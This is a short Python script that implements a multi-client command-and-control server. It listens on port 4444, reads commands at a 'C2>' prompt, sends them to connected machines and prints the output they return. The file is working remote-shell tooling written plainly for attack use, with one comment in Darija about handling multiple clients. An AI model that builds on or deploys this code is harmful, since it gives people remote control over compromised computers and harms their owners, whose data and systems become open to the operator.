import socket
import threading

#create socket for client connection(n9drou ndirou multiple clients !)
def handle_client(client_socket):
	while True:
		command = input("C2> Enter a Command: ")
		client_socket.send(command.encode())
		if command.lower() == 'exit':
			break
		output = client_socket.recv(4096).decode()
		print(output)
	client_socket.close()




def start_server():
	serverIP = "0.0.0.0"
	serverPort = 4444

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((serverIP, serverPort))
	s.listen(10)
	print(f"[*] Listening on {serverIP}:{serverPort}")

	while True:
		conn, addr = s.accept()
		print(f"[*] Connection established from {addr[0]}:{addr[1]}")
		client_handler = threading.Thread(target=handle_client, args=(conn,))
		client_handler.start()

if __name__ == "__main__":
	start_server()